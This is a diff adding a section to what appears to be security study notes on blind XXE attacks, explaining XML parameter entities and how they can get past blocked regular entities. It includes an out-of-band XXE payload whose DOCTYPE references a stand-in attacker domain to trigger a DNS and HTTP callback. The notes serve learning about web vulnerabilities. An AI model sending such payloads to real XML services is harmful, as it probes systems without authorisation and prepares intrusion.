@@ -56,5 +56,20 @@ You can often detect blind XXE using the same technique as for XXE SSRF attacks 
 You would then make use of the defined entity in a data value within the XML.
 
 This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.
+Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. 
+#### XML Parameter Entity
+In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:
+```
+<!ENTITY % myparameterentity "my parameter entity value" >
+```
+And second, parameter entities are referenced using the percent character instead of the usual ampersand:
+```
+%myparameterentity;
+```
+This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:
+```
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+```
+This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.
 
 ## Exploiting blind XXE to retrieve data via error messages
